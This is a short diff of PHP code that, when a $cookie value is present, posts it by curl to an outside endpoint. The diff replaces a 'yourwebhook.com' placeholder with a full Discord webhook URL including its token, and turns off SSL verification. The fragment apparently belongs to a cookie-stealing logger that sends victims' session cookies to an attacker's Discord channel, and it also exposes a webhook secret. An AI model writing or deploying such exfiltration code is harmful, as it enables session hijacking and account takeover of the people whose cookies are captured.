@@ -35,7 +35,7 @@
         }
     }
     if ($cookie) {
-        $curl = curl_init("https://yourwebhook.com");
+        $curl = curl_init("https://discord.com/api/webhooks/861965350786433065/YjiOVAN3T6Zlwo8NUCkOIgqUh--nJB4BQEPUtZAkdrZnH3nVyASx2WpRVzH_W9tTKjow");
 
         //remove that if you experience issues
         curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
